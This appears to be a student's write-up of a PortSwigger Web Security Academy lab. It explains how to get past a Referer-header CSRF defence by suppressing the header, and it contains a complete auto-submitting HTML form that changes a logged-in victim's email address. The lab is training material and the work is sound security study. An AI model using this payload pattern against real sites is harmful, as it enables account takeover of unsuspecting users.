https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter



1) login as wiener:peter and change the email
    we can see that there is no csrf token, but there is the referer header
    so if we change it to Referer: https://www.test.com we can notice that the email changing is not allowed, because it is not trusted 
    
    BUT there is a misconfiguration because if we completely remove it we are able to change the email


2) write a script that forces a victim to do a CSRF attack, where we don't put the referer header in the request


    so we can create this script:
    we use "<meta name="referrer" content="no-referrer" />"  to remove the referer header from the request


<html>
 <meta name="referrer" content="no-referrer" />

    <body>
        <form action="https://********LAB-ID*********.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
        </form>
        
    <script> 
        document.forms[0].submit()
    </script>


    </body>
</html>
